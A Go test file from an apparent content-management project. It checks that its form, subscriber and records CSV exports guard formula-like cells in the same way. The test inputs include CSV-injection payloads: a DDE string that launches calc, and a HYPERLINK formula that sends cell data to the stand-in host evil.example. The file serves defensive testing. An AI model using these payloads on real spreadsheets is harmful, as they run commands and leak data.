// SPDX-FileCopyrightText: 2026 Rashik Adhikari
// SPDX-License-Identifier: Apache-2.0

package admin

import (
	"encoding/csv"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/quilzo/quilzo/internal/collection"
	"github.com/quilzo/quilzo/internal/form"
	"github.com/quilzo/quilzo/internal/newsletter"
	"github.com/quilzo/quilzo/internal/sheet"
)

// The form export, the subscriber export and the records export write the
// same cell for the same value.
//
// Each had its own guard. The form export guarded a negative number the
// records export left alone, and the records export let through -Inf and
// -0x1p3, which the form export guarded: a value typed into a form and
// the same value kept in a record went out of the same site two ways.
func TestTheFormExportTheSubscriberExportAndTheRecordsExportGuardTheSameCells(t *testing.T) {
	values := []string{"plain", "-1", "+2.5", "=1+1", "+1+1", "-1+1", "@SUM(A1)", "\t=1", "\r=1",
		"-Inf", "-0x1p3", "-2+3+cmd|' /C calc'!A0", `=HYPERLINK("http://evil.example/"&A1)`}

	// The form export, through the screen.
	srv, token := setup(t)
	set := &form.Set{}
	if err := set.Add(form.Form{Name: "notes", Label: "Notes", Notice: "kept a month", RetentionDays: 30,
		Fields: []form.Field{{Name: "note", Label: "Note", Kind: form.Line}}}); err != nil {
		t.Fatal(err)
	}
	st, err := form.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	ids := map[string]int{}
	for i, v := range values {
		id := fmt.Sprintf("%032x", i+1)
		ids[id] = i
		if err := st.Put(form.Submission{Form: "notes", ID: id, At: time.Now().Unix(),
			Values: map[string]string{"note": v}}); err != nil {
			t.Fatal(err)
		}
	}
	srv.Forms = &Forms{Load: func() (*form.Set, error) { return set, nil },
		Save: func(*form.Set) error { return nil }, Store: st}
	rows := readCSV(t, postForm(t, srv, "/forms/export", token, "form=notes").Body.String())
	fromForm := make([]string, len(values))
	for _, r := range rows[1:] {
		fromForm[ids[r[0]]] = r[2]
	}

	// The subscriber export, a name per subscriber.
	var subs []newsletter.Subscriber
	for i, v := range values {
		subs = append(subs, newsletter.Subscriber{Email: fmt.Sprintf("s%d@example.com", i), Name: v,
			At: time.Now(), Confirmed: time.Now()})
	}
	var b strings.Builder
	if err := newsletter.WriteCSV(&b, subs); err != nil {
		t.Fatal(err)
	}
	var fromList []string
	for _, r := range readCSV(t, b.String())[1:] {
		fromList = append(fromList, r[1])
	}

	// The records export.
	var recs []collection.Record
	for i, v := range values {
		recs = append(recs, collection.Record{ID: fmt.Sprintf("r%02d", i), Created: int64(i),
			Fields: map[string]any{"note": v}})
	}
	var fromRecords []string
	for _, r := range readCSV(t, string(sheet.Write(nil, recs, sheet.WriteOptions{})))[1:] {
		fromRecords = append(fromRecords, r[1])
	}

	for i, v := range values {
		// The records export ends its lines with \r\n, and encoding/csv
		// drops a lone carriage return from such a file; what is compared
		// is the guard.
		f, l, r := strings.ReplaceAll(fromForm[i], "\r", ""), strings.ReplaceAll(fromList[i], "\r", ""), fromRecords[i]
		if f != l || l != r {
			t.Errorf("%q: the form export wrote %q, the subscriber export %q and the records export %q", v, f, l, r)
		}
		if sheet.IsFormula(v) && !strings.HasPrefix(r, "'") {
			t.Errorf("%q went out as a formula", v)
		}
	}
}

func readCSV(t *testing.T, body string) [][]string {
	t.Helper()
	rows, err := csv.NewReader(strings.NewReader(body)).ReadAll()
	if err != nil {
		t.Fatalf("%v\n%s", err, body)
	}
	return rows
}
